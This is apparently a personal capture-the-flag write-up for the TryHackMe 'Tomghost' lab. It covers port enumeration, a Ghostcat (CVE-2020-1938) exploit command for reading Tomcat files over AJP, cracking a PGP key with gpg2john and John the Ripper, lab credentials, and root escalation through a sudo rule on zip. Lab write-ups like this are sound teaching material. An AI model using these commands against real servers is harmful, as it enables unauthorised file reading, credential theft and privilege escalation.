# Enumeration 

8080/tcp open  http       syn-ack Apache Tomcat 9.0.30                                                                        
|_http-favicon: Apache Tomcat                                                                                                 
| http-methods:                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                  
|_http-title: Apache Tomcat/9.0.30                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
53/tcp   open  tcpwrapped syn-ack                                                                                             
8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3) 
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

## port 8080

Normal tomcat server

## Port 53 
Nothing much

# Exploitation 





## port 8009
is jserv 
doing some research found a vulnerability called ghostcat that allows unathunticated users to read server files  and server version looks vulnerable 
[CVE-2020-1938 Repo](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md)

```bash
python CVE-2020-1938.py $ip -p 8009 -f WEB-INF/web.xml
```
![[Pasted image 20230105193959.png]]

skyfuck:8730281lkjlkjdqlksalks ssh creds valid



# Privesc 

found .asc and .pgp files 
trying to decrypt .pgp file using asc key

```
gpg --import tryhackme.asc
gpg --decrypt credintial.pgp
```
password protected running gpg2john to decrypt it

```
gpg2john tryhackme.asc > hash
john hash --wordlist=/usr/share/wordlist/rockyou.txt
```

![[Pasted image 20230105195234.png]]

![[Pasted image 20230105195245.png]]

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

running sudo -l 

![[Pasted image 20230105195354.png]]
![[Pasted image 20230105195455.png]]
[gtfobins](https://gtfobins.github.io/gtfobins/zip/)

![[Pasted image 20230105195442.png]]
# Conclusion

- Server was vulnerable to ghostcat which lead to information disclosure and found ssh creds
- other users creds unsecured and lead to compromising merlin user
- user having sudo perm on zip which lead to root

---
Tags: #CVE-2020-1938 #tomcat #gtfobins #sudo_privesc 
Resources: [Tomghost](https://tryhackme.com/room/tomghost) 